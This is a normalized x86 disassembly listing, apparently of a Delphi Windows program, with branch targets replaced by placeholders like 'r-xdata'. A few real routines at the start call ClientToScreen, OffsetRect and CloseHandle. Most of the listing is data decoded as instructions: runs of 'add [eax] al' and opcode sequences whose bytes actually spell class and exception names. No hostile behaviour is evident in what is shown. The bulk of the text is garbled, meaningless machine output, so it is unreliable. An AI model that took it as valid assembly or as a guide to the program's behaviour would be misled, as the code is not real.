lea eax [ ebp - 0x28 ]
call sub_403fd8
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_440d98
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_46112c
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43f6c8
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43f6c8
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43fd50
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45ebcc
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_46118c
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_460da8
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_460da8
jmp r-xdata
sub_4615cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403f94
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403f94
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_461608
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_440d98
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_440d98
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44c36c
sub_461698
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_4616c0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_461764
add [ eax ] eax
add [ eax ] al
fdivr [ ebp + 0x48 ]
add [ edi + edi * 4 + 0x43 ] dl
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4617c7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4617ce
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_457124
mov eax sub_4573a4
call sub_4179c8
mov eax [ rw-data ]
push eax
call CloseHandle
sub_461818
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
sbb [ esi ] al
or al 0x0
add [ eax ] al
dec esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx + 0xc0046 ] bh
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] dl
inc ebp
dec ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x78456449 ] cl
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ecx ] 0x46
add [ eax + eax ] cl
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
imul ebp [ edi + 0x6e ] 0x46191c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx ] bl
inc esi
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x19
outsd
outsb
lea eax [ eax ]
mov esp 0x4618
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
sbb al [ esi ]
or al 0x0
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ esi ] bl
inc ebp
dec ecx
push edx
popad
dec esp
outsb
dec ebp
popad
js r-xdata
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
pop ss
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
inc ebx
insb
outsd
jae r-xdata
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edi ] dl
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc eax 0x49644945
imul ebp [ esi + 0x65 ] 0x676e654c
je r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edi ] cl
inc ebp
dec ecx
inc ebx
insb
outsd
jae r-xdata
xor eax [ eax ]
sbb [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc edi
jb r-xdata
inc ebp
dec ecx
push eax
jb r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
popad
insd
mov eax eax
inc ebp
js r-xdata
arpl [ ebp + 0x66 ] sp
jne r-xdata
mov eax eax
je r-xdata
dec esi
outsb
jbe r-xdata
nop
movsb [ edi ] [ esi ]
sbb al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
sbb al [ esi ]
or al 0x0
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x49644945 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ ecx ]
inc esi
add [ eax + eax ] cl
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ esi ] cl
inc ebp
dec ecx
push edx
popad
push esp
imul ebp [ ebp + 0x65 ] 0x9074756f
cmp [ edx ] bl
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0xc0046 ] cl
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x53644945 ] dl
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
outsd
outsb
xor [ esi + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sbb al 0x46
rcr [ ebx ] 0x1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
sbb eax [ esi ]
or al 0x0
arpl [ edi + 0x6c ] bp
push edx
jo r-xdata
push ebx
imul ebp [ ebp + 0x6e ] 0x63784574
jo r-xdata
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc al [ ebp + 0x49 ]
sbb [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1d ] bl
inc esi
add [ eax + eax ] cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx ] ah
jae r-xdata
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
sbb eax 0xc0046
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x1cf0c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
sbb al 0x46
add [ eax + eax ] cl
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ebx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ebx ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
ror [ esp + ebx + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc [ ebp + 0x49 ] eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x1e
dec ecx
outsb
je r-xdata
nop
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x53644945 ] cl
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ esi + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ ebx ] 0x1
inc esi
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc00461f
push 0x6f727245
jb r-xdata
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edi ] dl
inc ebp
jae r-xdata
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
add al 0x31
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc al 0x45
dec ecx
push ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
sbb eax 0xc0046
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
popad
imul ebp [ ebp + 0x64 ] 0x461dc090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx + 0xc0046 ] cl
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
outsd
jb r-xdata
rcr [ 0x46 ] 0x0
push ebx
jb r-xdata
push ebx
jb r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
shl [ eax + 0x1b ] 0x46
add [ eax ] al
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
rcl [ eax + 0x1f ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1f ] dl
inc esi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
outsd
outsb
inc ebp
jb r-xdata
jno r-xdata
inc eax
add [ esi + ebx ] ah
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x6f536449 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ 0xc0046 ] 0x0
add ah ah
sbb eax [ esi ]
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1b ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ecx ] dl
inc ebp
dec ecx
or [ ebx ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx ] cl
inc esi
add [ eax ] dl
add [ eax ] al
add [ eax + ebx ] dl
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] ch
and eax [ esi ]
adc eax 0x50644945
imul esp [ ebx + 0x65 ] 0x656d614e
mov eax eax
jb r-xdata
outsd
jb r-xdata
add al 0x31
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
and [ ebp + 0x49 ] eax
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
pop ds
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
push ds
inc esi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ecx ] dl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
outsd
jb r-xdata
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
popad
imul ebp [ ebp + 0x64 ] r-xdata
xchg esp eax
and [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
and [ esi ] al
or al 0x0
add al 0x21
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
jb r-xdata
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
rcl [ eax + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046 ] dl
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
jb r-xdata
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
sbb eax 0x53644945
outsb
inc ecx
jne r-xdata
push ds
inc esi
inc ebp
jb r-xdata
mov [ esi ] ds
inc esi
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
push esp
jb r-xdata
mov eax eax
outsd
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
and al [ ebp + 0x49 ]
je r-xdata
jb r-xdata
popad
jb r-xdata
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
shl [ eax ] 0x46
jb r-xdata
insb
inc ebp
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x6f536449 ] ah
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
outsd
jae r-xdata
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
outsd
outsb
outsb
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
outsd
jb r-xdata
outsd
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] ah
inc ebp
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc esi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ecx ] ah
inc ebp
dec ecx
outsd
jb r-xdata
shl ah 0x21
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
and [ esi ] eax
or al 0x0
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x21
inc esi
add [ eax + eax ] cl
outsb
push edx
jne r-xdata
outsd
inc ebp
jb r-xdata
dec esp
and al [ esi ]
add [ eax ] al
jb r-xdata
jb r-xdata
nop
inc eax
add [ eax + 0x21 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
